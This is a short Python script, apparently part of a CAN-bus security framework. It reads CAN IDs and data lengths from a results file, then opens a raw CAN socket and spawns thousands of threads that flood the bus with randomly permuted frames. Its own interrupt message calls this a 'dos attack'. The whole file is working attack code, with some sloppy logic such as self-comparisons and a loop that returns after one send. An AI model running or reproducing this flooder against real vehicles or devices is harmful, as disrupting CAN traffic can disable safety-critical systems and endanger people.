import os
import sys
import struct
import itertools
import socket
from threading import *
import random
from lib.interface import DEFAULT_INTERFACE

data_val = "000012345"

sock = socket.socket(socket.PF_CAN, socket.SOCK_RAW, socket.CAN_RAW) #crating socket
sock.setsockopt(socket.SOL_CAN_RAW, socket.CAN_RAW_ERR_FILTER, socket.CAN_ERR_MASK)#allow socket to receive error frames
interface = DEFAULT_INTERFACE

def file_r():
    try:
        #file = open('/home/iot/Desktop/my-work/my-python/framwork/sort.txt', 'r')
        file = open('results/sort.txt', 'r')
        lines = file.readlines()
        for line in lines:
            file_value = line.strip()
            data_value = file_value.split("#", 1)[1]
            id_value = file_value.split("#", 1)[0]
            data_lenth = int(data_value)

            if id_value == id_value :
                if data_lenth == data_lenth :
                    t=list(itertools.permutations(data_val, data_lenth))
                    for i in range(2000):
                        idx=random.randint(0,len(t)-1)
                        k=''.join(str(e) for e in t[idx])
                        #print(id_value,"#",k)
                        #print(int(id_value,16),'#',int(k))
                        b = int(k)
                        d = int(id_value,16)

                        x = Thread(target=can_data_msg, args=(d,data_lenth,b))
                        x.start()

    except KeyboardInterrupt:
        print("\n dos attack stoped!")

def can_data_msg(d,data_lenth,b):
    try:
        sock.bind((interface,))

    except socket.error as e:
        print(str(e))
        print("\n--------------------------------------------------------------------------------")

    can_frame_format = "<LB3xq"
    can_msg = struct.pack(can_frame_format,d,data_lenth,b)

    try:
        while True:
            msg = sock.send(can_msg)

            return msg

    except KeyboardInterrupt:
        print("!")

file_r()
